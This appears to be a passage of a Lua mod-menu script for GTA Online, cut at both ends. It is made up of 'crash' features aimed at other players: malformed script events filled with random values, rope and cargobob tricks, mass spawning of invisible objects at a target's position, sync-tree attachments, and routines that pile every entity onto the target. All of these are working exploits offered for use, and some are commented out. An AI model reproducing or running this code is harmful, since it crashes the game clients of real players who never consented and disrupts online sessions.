script.trigger_script_event(-0x756DBC8A, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
script.trigger_script_event(-0x69532BA0, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
script.trigger_script_event(0x68C5399F, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
script.trigger_script_event(-0x177132B8, pid, {math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647), math.random(-2147483647, 2147483647)})
script.trigger_script_event(962740265, pid, {player.player_id(), pid, 1001, pid})
script.trigger_script_event(-0x177132B8, pid, {player.player_id(), math.random(-2147483647, 2147483647), pid})
script.trigger_script_event(436475575, pid, {player.player_id(), 4113865})
script.trigger_script_event(-1767058336, pid, {player.player_id(), 20923579})
script.trigger_script_event(2112408256, pid, {77777778})
script.trigger_script_event(924535804, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), pid})
script.trigger_script_event(1445703181, pid, {player.player_id(), pid, math.random(-2147483647, 2147483647), 136236, math.random(-5262, 216247), math.random(-2147483647, 2147483647), math.random(-2623647, 2143247), 1587193, math.random(-214626647, 21475247), math.random(-2123647, 2363647), 651264, math.random(-13683647, 2323647), 1951923, math.random(-2147483647, 2147483647), math.random(-2136247, 21627), 2359273, math.random(-214732, 21623647), pid})
pos = player.get_player_coords(pid)
pos.x = pos.x + 2
newRope = rope.add_rope(pos,v3(0,0,10),1,1,0,1,1,false,false,false,1.0,false)
pos = player.get_player_coords(pid)
car = spawn_vehicle(0X187D938D,pos,0)
local pos = player.get_player_coords(pid)
local ppos = player.get_player_coords(pid)
pos.x = pos.x+5
ppos.z = ppos.z+1
pedp=player.get_player_ped(pid)
cargobob = spawn_vehicle(    2132890591,pos,0)
kur =Cped(26,2727244247,ppos,0)
entity.set_entity_god_mode(kur,true)
newRope = rope.add_rope(pos,v3(0,0,0),1,1,0.0000000000000000000000000000000000001,1,1,true,true,true,1.0,true)
rope.attach_entities_to_rope(newRope,cargobob,kur,entity.get_entity_coords(cargobob),entity.get_entity_coords(kur),2 ,0,0,"Center","Center")
system.wait(1)
			local vehicles = utilities.get_table_of_entities(vehicle.get_all_vehicles(), 1000, 5000, true, true, player.get_player_coords(pid))
				network.request_control_of_entity(player.get_player_ped(pid))
				menu.notify("5G Crash: " .. #vehicles .. " valid subjects found! Executing Crash...", AddictScript, 4, 0x64FA7800)
				system.wait(1)
					utilities.request_model(2971866336)
					tow_truck_5g_vehicle = vehicle.create_vehicle(2971866336, utilities.offset_coords_forward(player.get_player_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10), 0, true, false)
					utilities.request_model(3852654278)
					tow_truck_5g_vehicle = vehicle.create_vehicle(3852654278, utilities.offset_coords_forward(player.get_player_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10), 0, true, false)
				entity.set_entity_god_mode(tow_truck_5g_vehicle, true)
				entity.set_entity_visible(tow_truck_5g_vehicle, false)
					system.wait(1)
					system.yield(1)
					network.request_control_of_entity(player.get_player_ped(pid))
					ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
				network.request_control_of_entity(player.get_player_ped(pid))
				utilities.request_control_silent(tow_truck_5g_vehicle)
				utilities.hard_remove_entity(tow_truck_5g_vehicle)
		menu.notify("Wide Lobby Crash executed successfully.")
	else
		menu.notify("Invalid Player.")
	end
end)


---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


menu.add_player_feature("Crash - Object Crash" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
        pos = player.get_player_coords(player.player_id())
            pos.z = pos.z - (200)
        freecam_player_cam = native.call(0xB51194800B257161, "DEFAULT_SCRIPTED_CAMERA", pos.x, pos.y, pos.z, cam.get_gameplay_cam_rot().x, cam.get_gameplay_cam_rot().y, cam.get_gameplay_cam_rot().z, 70.0, false, false):__tointeger64()
        native.call(0x026FB97D0A425F84, freecam_player_cam, true)
        native.call(0x07E5B515DB0636FC, true, false, 0, true, true, 0)
        system.yield(1000)
        aakk= object.create_world_object(-1364166376, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(aakk ,player.get_player_coords(pid))
        A= object.create_world_object(1734157390, v3(0, 0, 0), true, true)
        entity.set_entity_visible(A, false)
        entity.set_entity_coords_no_offset(A ,player.get_player_coords(pid))
        B= object.create_world_object(3882145684, v3(0, 0, 0), true, true)
        entity.set_entity_visible(B, false)
        entity.set_entity_coords_no_offset(B ,player.get_player_coords(pid))
        C= object.create_world_object(3864969444, v3(0, 0, 0), true, true)
        entity.set_entity_visible(C, false)
        entity.set_entity_coords_no_offset(C ,player.get_player_coords(pid))
        D= object.create_world_object(3854081329, v3(0, 0, 0), true, true)
        entity.set_entity_visible(D, false)
        entity.set_entity_coords_no_offset(D ,player.get_player_coords(pid))
        E= object.create_world_object(3786323720, v3(0, 0, 0), true, true)
        entity.set_entity_visible(E, false)
        entity.set_entity_coords_no_offset(E ,player.get_player_coords(pid))
        F= object.create_world_object(3726116795, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(F ,player.get_player_coords(pid))
        system.yield(10)
        G= object.create_world_object(3656664908, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(G ,player.get_player_coords(pid))
        H= object.create_world_object(3648109486, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(H ,player.get_player_coords(pid))
        I= object.create_world_object(3656664908, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(I ,player.get_player_coords(pid))
        J= object.create_world_object(3613262246, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(J ,player.get_player_coords(pid))
        K= object.create_world_object(3511376803, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(K ,player.get_player_coords(pid))
        system.yield(10)
        L= object.create_world_object(3480918685, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(L ,player.get_player_coords(pid))
        M= object.create_world_object(875648136,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(M ,player.get_player_coords(pid))
        N= object.create_world_object(3476535839, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(N ,player.get_player_coords(pid))
        O= object.create_world_object(3405520579, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(O ,player.get_player_coords(pid))
        P= object.create_world_object(3330907358, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(P ,player.get_player_coords(pid))
        system.yield(10)
        Q= object.create_world_object(3303982422, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(Q ,player.get_player_coords(pid))
        R= object.create_world_object(3301528862, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(R ,player.get_player_coords(pid))
        S= object.create_world_object(3284142177, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(S ,player.get_player_coords(pid))
        T= object.create_world_object(3269941793, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(T ,player.get_player_coords(pid))
        U= object.create_world_object(3268188632, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(U ,player.get_player_coords(pid))
        V= object.create_world_object(3269941793, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(V ,player.get_player_coords(pid))
        system.yield(10)
        W= object.create_world_object(3268188632, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(W ,player.get_player_coords(pid))
        X= object.create_world_object(3229061844, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(X ,player.get_player_coords(pid))
        Y= object.create_world_object(3063601656, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(Y ,player.get_player_coords(pid))
        Z= object.create_world_object(2783171697, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(Z ,player.get_player_coords(pid))
        a= object.create_world_object(2410820516, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(a ,player.get_player_coords(pid))
        system.yield(10)
        b= object.create_world_object(2180726768, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(b ,player.get_player_coords(pid))
        c= object.create_world_object(2041844081, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(c ,player.get_player_coords(pid))
        d= object.create_world_object(2040219850, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(d ,player.get_player_coords(pid))
        e= object.create_world_object(2015249693, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(e ,player.get_player_coords(pid))
        f= object.create_world_object(2783171697, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(f ,player.get_player_coords(pid))
        g= object.create_world_object(1982224326, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(g ,player.get_player_coords(pid))
        system.yield(10)
        h= object.create_world_object(1936183844, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(h ,player.get_player_coords(pid))
        i= object.create_world_object(1793920587, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(i ,player.get_player_coords(pid))
        j= object.create_world_object(1781006001, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(j,player.get_player_coords(pid))
        k= object.create_world_object(1775565172, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(k ,player.get_player_coords(pid))
        l= object.create_world_object(1759812941, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(l ,player.get_player_coords(pid))
        m= object.create_world_object(1734157390, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(m ,player.get_player_coords(pid))
        system.yield(10)
        n= object.create_world_object(2040219850, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(n ,player.get_player_coords(pid))
        o= object.create_world_object(1727217687, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(o ,player.get_player_coords(pid))
        p= object.create_world_object(1567950121, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(p ,player.get_player_coords(pid))
        q= object.create_world_object(1481697203, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(q ,player.get_player_coords(pid))
        r= object.create_world_object(1221915621, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(r ,player.get_player_coords(pid))
        system.yield(10)
        s= object.create_world_object(987584502,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(s ,player.get_player_coords(pid))
        t= object.create_world_object(987584502,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(t ,player.get_player_coords(pid))
        u= object.create_world_object(875648136,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(u ,player.get_player_coords(pid))
        v= object.create_world_object(863710036,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(v ,player.get_player_coords(pid))
        w= object.create_world_object(618696223,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(w ,player.get_player_coords(pid))
        x= object.create_world_object(2410820516, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(x ,player.get_player_coords(pid))
        system.yield(10)
        y= object.create_world_object(450174759,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(y ,player.get_player_coords(pid))
        z= object.create_world_object(1198835546, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(z ,player.get_player_coords(pid))
        aa= object.create_world_object(386259036,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(aa ,player.get_player_coords(pid))
        bb= object.create_world_object(213036232,  v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(bb ,player.get_player_coords(pid))
        cc= object.create_world_object(3656664908, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(cc ,player.get_player_coords(pid))
        dd= object.create_world_object(3330907358, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(dd ,player.get_player_coords(pid))
        system.yield(10)
        ee= object.create_world_object(17258065,   v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(ee ,player.get_player_coords(pid))
        ff= object.create_world_object(3269941793, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(ff ,player.get_player_coords(pid))
        gg= object.create_world_object(1872771678, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(gg ,player.get_player_coords(pid))
        hh= object.create_world_object(-41176169, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(hh ,player.get_player_coords(pid))
        ii= object.create_world_object(122627294, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(ii ,player.get_player_coords(pid))
        jj= object.create_world_object(446398, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(jj ,player.get_player_coords(pid))
        kk= object.create_world_object(849958566, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(kk ,player.get_player_coords(pid))
		ll= object.create_world_object(-930879665, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(ll ,player.get_player_coords(pid))
		system.yield(10)
		mm= object.create_world_object(452618762, v3(0, 0, 0), true, true)
        entity.set_entity_coords_no_offset(mm ,player.get_player_coords(pid))
        menu.notify("Finished", "Object Crash")
system.wait(1000)
        pos= player.get_player_coords(pid)
            pos.z = pos.z + (0.6)
            pos.x = pos.x + (0.2)
        native.call(0x3E93E06DB8EF1F30)
        native.call(0x865908C81A2C22E9, freecam_player_cam, false)
        native.call(0x07E5B515DB0636FC, false, false, 0, true, true, 0)
        freecam_player_cam = nil
        menu.notify("Make sure that the player is freezed", "Object Crash")
        for i = 0, 500 do
            pos= player.get_player_coords(pid)
            pos.z = pos.z - (3.0)
            a=object.create_world_object(0x71A7F702, player.get_player_coords(pid), true, true)
            entity.set_entity_collision(a, false, true, true)
        end
system.wait(1000)
        menu.notify("Finished", "Object Crash")
    elseif feat.value == 2 then
        streaming.request_model(4221382737)
        local sync_tree_children_hashes = {849958566, -568220328, 2155335200, 1272323782, 1296557055, 29828513, 2250084685, 2349112599, 1599985244, 3523942264, 3457195100, 3762929870, 1016189997, 861098586, 3613262246, 3245733464, 2494305715, 671173206, 3769155529, 978689073, 100436592, 3107991431, 1327834842, 1239708330}
        local sync_tree_children = {}
        local main_sync_handler = object.create_world_object(4221382737, player.get_player_coords(pid) + v3(300, 300, 300), true, false)
        network.request_control_of_entity(main_sync_handler)
        for i = 1, #sync_tree_children_hashes do
            streaming.request_model(sync_tree_children_hashes[i])
            sync_tree_children[i] = object.create_world_object(sync_tree_children_hashes[i], player.get_player_coords(pid) + v3(300, 300, 300), true, false)
            network.request_control_of_entity(sync_tree_children[i])
            entity.attach_entity_to_entity(sync_tree_children[i], main_sync_handler, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, false)
        end
        local time = utils.time_ms() + 2000
        while time > utils.time_ms() do
            system.yield(math.random(0, 10))
            entity.set_entity_coords_no_offset(main_sync_handler, v3(player.get_player_coords(pid).x + math.random(-1, 1), player.get_player_coords(pid).y + math.random(-1, 1), player.get_player_coords(pid).z + math.random(-1, 1)))
        end
        network.request_control_of_entity(main_sync_handler)
        entity.delete_entity(main_sync_handler)
        for i = 1, #sync_tree_children do
            if entity.is_an_entity(sync_tree_children[i]) then
                network.request_control_of_entity(sync_tree_children[i])
                entity.delete_entity(sync_tree_children[i])
            end
        end
        menu.notify("Finished", "Object Crash")
    elseif feat.value == 3 then
        streaming.request_model(-310622473)
        streaming.request_model(-500649904)
        pos = player.get_player_coords(pid)
        local invalidObjects = {-310622473, -500649904}
        system.yield(100)
        monitor1 = object.create_world_object(-310622473, pos, true, false)
        monitor2 = object.create_world_object(-500649904, pos, true, false)
        entity.attach_entity_to_entity(monitor1, monitor2, 0, v3(0, 0, 0), v3(0, 0, 0), true, true, false, 0, false)
        system.yield(4000)
        entity.delete_entity(monitor1)
        entity.delete_entity(monitor2)
        entity.set_entity_as_no_longer_needed(monitor1)
        entity.set_entity_as_no_longer_needed(monitor2)
        menu.notify("Finished", "Object Crash")
system.wait(100)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)


menu.add_player_feature("Crash - Math Crash x3", "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server do math..", AddictScript)
		rope.rope_load_textures()
		utilities.request_model(2132890591)
		utilities.request_model(2727244247)
		local vehicle_ = vehicle.create_vehicle(2132890591, player.get_player_coords(player.player_id()) + v3(5, 0, 0), 0, true, false)
		local ped_ = ped.create_ped(26, 2727244247, player.get_player_coords(player.player_id()) + v3(0, 0, 1), 0, true, false)
		network.request_control_of_entity(vehicle_)
		network.request_control_of_entity(ped_)
		entity.set_entity_god_mode(ped_, true)
		entity.set_entity_visible(ped_, false)
		entity.set_entity_visible(vehicle_, false)
		local rope_ = rope.add_rope(player.get_player_coords(player.player_id()) + v3(5, 0, 0), v3(0, 0, 0), 1, 1, 0.0000000000000000000000000000000000001, 1, 1, true, true, true, 1, true)
		rope.attach_entities_to_rope(rope_, vehicle_, ped_, entity.get_entity_coords(vehicle_), entity.get_entity_coords(ped_), 2, 0, 0, "Center", "Center")
		system.wait(1000)
		local pos = player.get_player_coords(pid)
		local ppos = player.get_player_coords(pid)
		pos.x = pos.x+5
		ppos.z = ppos.z+1
		pedp=player.get_player_ped(pid)
		cargobob = spawn_vehicle(    2132890591,pos,0)
		kur =Cped(26,2727244247,ppos,0)
		entity.set_entity_god_mode(kur,true)
		newRope = rope.add_rope(pos,v3(0,0,0),1,1,0.0000000000000000000000000000000000001,1,1,true,true,true,1.0,true)
		rope.attach_entities_to_rope(newRope,cargobob,kur,entity.get_entity_coords(cargobob),entity.get_entity_coords(kur),2 ,0,0,"Center","Center")
		utilities.request_control_silent(vehicle_)
		utilities.request_control_silent(ped_)
		utilities.hard_remove_entity(vehicle_)
		utilities.hard_remove_entity(ped_)
		rope.delete_rope(rope_)
		rope.rope_unload_textures()
		menu.notify("Math Crash executed successfully.", AddictScript)
system.wait(100)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - USB Crash" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server do eat USB's...", AddictScript)
    pos = player.get_player_coords(pid)
        pos.x = pos.x + (40)
        pos.y = pos.y + (40)
        pos.z = pos.z - (40)
    freecam_player_cam = native.call(0xB51194800B257161, "DEFAULT_SCRIPTED_CAMERA", pos.x, pos.y, pos.z, cam.get_gameplay_cam_rot().x, cam.get_gameplay_cam_rot().y, cam.get_gameplay_cam_rot().z, 70.0, false, false):__tointeger64()
	native.call(0x026FB97D0A425F84, freecam_player_cam, true)
	native.call(0x07E5B515DB0636FC, true, true, 1000, true, true, 0)
    system.yield(1000)
    hash = gameplay.get_hash_key("player_zero")
    streaming.request_model(hash)
    while not streaming.has_model_loaded(hash) do
        system.yield()
    end
    invalidped = ped.create_ped(26, hash, player.get_player_coords(pid), 0, true, false)
    entity.freeze_entity(invalidped, true)
    while f.on do
    for n=0, 100 do
        pos = player.get_player_coords(pid)
            pos.x = pos.x + math.random(-1, 1)
            pos.y = pos.y + math.random(-1, 1)
        entity.set_entity_coords_no_offset(invalidped, pos)
        ped.set_ped_component_variation(invalidped, 0, math.random(0, 10), math.random(0, 10), 11)
        system.yield(10)
        end
    end
    entity.delete_entity(invalidped)
    native.call(0x3E93E06DB8EF1F30)
    native.call(0x865908C81A2C22E9, freecam_player_cam, false)
	native.call(0x07E5B515DB0636FC, false, false, 0, true, true, 0)
	freecam_player_cam = nil
			menu.notify("USB Crash executed successfully.", AddictScript)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)
--[[
menu.add_player_feature("Crash - HATAR4 Crash" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server do HATAR4...", AddictScript)
    streaming.request_model(0x705E61F2)
    pos_recov = player.get_player_coords(player.player_id())
    while not streaming.has_model_loaded(0x705E61F2) do
        system.yield()
    end
    pos = player.get_player_coords(pid)
        pos.x = pos.x + (10)
        pos.y = pos.y + (10)
        pos.z = pos.z + (10)
    freecam_player_cam = native.call(0xB51194800B257161, "DEFAULT_SCRIPTED_CAMERA", pos.x, pos.y, pos.z, cam.get_gameplay_cam_rot().x, cam.get_gameplay_cam_rot().y, cam.get_gameplay_cam_rot().z, 70.0, false, false):__tointeger64()
	native.call(0x026FB97D0A425F84, freecam_player_cam, true)
	native.call(0x07E5B515DB0636FC, true, true, 1000, true, true, 0)
    system.yield(1000)
    entity.set_entity_alpha(player.get_player_ped(player.player_id()), 0)
    origin = ped.get_ped_drawable_variation(player.get_player_ped(player.player_id()), 11)
    origin_col = ped. get_ped_texture_variation(player.get_player_ped(player.player_id()), 11)
        pos_recov = player.get_player_coords(player.player_id())
        entity.freeze_entity(player.get_player_ped(player.player_id()), true)
        for n=0, 5 do
            pos = player.get_player_coords(pid)
            pos.x = pos.x + math.random(-2, 2)
            pos.y = pos.y + math.random(-2, 2)
            pos.z = pos.z + (1)
            entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos)
            ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 11, 393, math.random(0, 15), 0)
            system.yield(300)
        end
        entity.freeze_entity(player.get_player_ped(player.player_id()), false)
        entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos_recov)
        system.yield()
    end
    ped.set_ped_component_variation(player.get_player_ped(player.player_id()), 11, origin, origin_col, origin)
    entity.set_entity_coords_no_offset(player.get_player_ped(player.player_id()), pos_recov)
    entity.set_entity_alpha(player.get_player_ped(player.player_id()), 255)
    native.call(0x3E93E06DB8EF1F30)
    native.call(0x865908C81A2C22E9, freecam_player_cam, false)
	native.call(0x07E5B515DB0636FC, false, false, 0, true, true, 0)
	freecam_player_cam = nil
	end
end)

menu.add_player_feature("Crash - 5G Tow Truck Spam", "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
			local vehicles = utilities.get_table_of_entities(vehicle.get_all_vehicles(), 1000, 5000, true, true, player.get_player_coords(pid))
				network.request_control_of_entity(player.get_player_ped(pid))
				menu.notify("5G Crash: " .. #vehicles .. " valid subjects found! Executing Crash...", AddictScript, 4, 0x64FA7800)
				system.wait(1)
					utilities.request_model(2971866336)
					tow_truck_5g_vehicle = vehicle.create_vehicle(2971866336, utilities.offset_coords_forward(player.get_player_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10), 0, true, false)
					utilities.request_model(3852654278)
					tow_truck_5g_vehicle = vehicle.create_vehicle(3852654278, utilities.offset_coords_forward(player.get_player_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10), 0, true, false)
				entity.set_entity_god_mode(tow_truck_5g_vehicle, true)
				entity.set_entity_visible(tow_truck_5g_vehicle, false)
					system.wait(1)
					system.yield(0)
					network.request_control_of_entity(player.get_player_ped(pid))
					ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
				network.request_control_of_entity(player.get_player_ped(pid))
				utilities.request_control_silent(tow_truck_5g_vehicle)
				utilities.hard_remove_entity(tow_truck_5g_vehicle)
			menu.notify("Math Crash executed successfully.", AddictScript)
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - 5G Tow Truck", "action_value_str", playerparents["Lobby Crashes"], function(f, pid)
	if player.is_player_valid(pid) then
		if network.get_player_player_is_spectating(player.player_id()) == pid or utilities.get_distance_between(player.get_player_ped(player.player_id()), player.get_player_ped(pid)) < 100 then
			local vehicles = utilities.get_table_of_entities(vehicle.get_all_vehicles(), 1000, 5000, true, true, player.get_player_coords(pid))

			for i = 1, #vehicles do
				network.request_control_of_entity(vehicles[i])
			end

			if #vehicles > 30 then
				menu.notify("5G Crash: " .. #vehicles .. " valid subjects found! Executing Crash...", AddictScript, 4, 0x64FA7800)
				system.wait(1000)

				if f.value == 0 then
					utilities.request_model(2971866336)
					tow_truck_5g_vehicle = vehicle.create_vehicle(2971866336, utilities.offset_coords_forward(player.get_player_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10), 0, true, false)
				elseif f.value == 1 then
					utilities.request_model(3852654278)
					tow_truck_5g_vehicle = vehicle.create_vehicle(3852654278, utilities.offset_coords_forward(player.get_player_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10), 0, true, false)
				end
				entity.set_entity_god_mode(tow_truck_5g_vehicle, true)
				entity.set_entity_visible(tow_truck_5g_vehicle, false)

				for i = 1, #vehicles do
					network.request_control_of_entity(vehicles[i])
					entity.set_entity_god_mode(vehicles[i], true)
					entity.set_entity_visible(vehicles[i], false)
				end
				for i = 1, #vehicles do
					network.request_control_of_entity(vehicles[i])
					entity.attach_entity_to_entity(vehicles[i], tow_truck_5g_vehicle, 0, v3(), v3(), true, true, false, 0, false)
					system.wait(1)
				end

				local time = utils.time_ms() + 2000
				while time > utils.time_ms() do
					system.yield(0)
					network.request_control_of_entity(player.get_player_ped(pid))
					ped.clear_ped_tasks_immediately(player.get_player_ped(pid))
					for i = 1, #vehicles do
						network.request_control_of_entity(vehicles[i])
						entity.set_entity_coords_no_offset(vehicles[i], utilities.offset_coords_forward(player.get_player_coords(pid) + v3(0, 0, 5), player.get_player_heading(pid), 10))
					end
				end

				utilities.request_control_silent(tow_truck_5g_vehicle)
				utilities.hard_remove_entity(tow_truck_5g_vehicle)

				for i = 1, #vehicles do
					utilities.request_control_silent(vehicles[i])
					utilities.hard_remove_entity(vehicles[i])
				end

				menu.notify("5G Tow Truck Crash executed successfully.", AddictScript)
			else
				menu.notify("5G Crash: Not enough valid subjects found!", AddictScript, 4, 211)
			end
		else
			menu.notify("You have to spectate the target or be near them in order for this feature to work.", AddictScript, 5, 211)
		end
	else
		menu.notify("Invalid Player.", AddictScript, 3, 211)
	end
end):set_str_data({
	"v1",
	"v2"
})
]]
menu.add_player_feature("Crash - Entity Dump Crash" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server Entity Dump...", AddictScript)
    streaming.request_model(0x78BC1A3C)
    streaming.request_model(0x15F27762)
    streaming.request_model(0x0E512E79)
    for i=0, 10 do
    local allpeds = ped.get_all_peds()
    local allvehicles = vehicle.get_all_vehicles()
    local allobjects = object.get_all_objects()
    local ownped = player.get_player_ped(player.player_id())
    vehicle.create_vehicle(0x78BC1A3C, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    vehicle.create_vehicle(0x15F27762, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    vehicle.create_vehicle(0x0E512E79, player.get_player_coords(pid), player.get_player_coords(pid).z, true, false)
    for i = 1, #allpeds do
        if allpeds[i] ~= ownped then
            entity.set_entity_coords_no_offset(allpeds[i], player.get_player_coords(pid))
        end
    end
    for i = 1, #allvehicles do
        if allvehicles[i] ~= ownvehicle then
            entity.set_entity_coords_no_offset(allvehicles[i], player.get_player_coords(pid))
            vehicle.set_vehicle_on_ground_properly(allvehicles[i])
            vehicle.set_taxi_lights(allvehicles[i])
        end
    end
    for i = 1, #allobjects do
        entity.set_entity_coords_no_offset(allobjects[i], player.get_player_coords(pid))
    end
    system.wait(400)
    end
    ped.resurrect_ped(player.get_player_ped(pid))
    menu.notify("Finished", "Entity Dump Crash")
		else
			f.on = false
			menu.notify("Invalid Player.", AddictScript, 3, 211)
			return
		end
	end
end)

menu.add_player_feature("Crash - Jet Cargo Dump Crash v1" , "toggle", playerparents["Lobby Crashes"], function(f, pid)
	while f.on do
		system.yield(0)
		if player.is_player_valid(pid) then
		menu.notify("Made the server Entity Dump...", AddictScript)
    streaming.request_model(0x39D6E83F)
    streaming.request_model(0x15F27762)
    streaming.request_model(0x39D6E83F)
    for i=0, 10 do
    local allpeds = ped.get_all_peds()
    local allvehicles = vehicle.get_all_vehicles()
    local allobjects = object.get_all_objects()
    local ownped = player.get_player_ped(player.player_id())
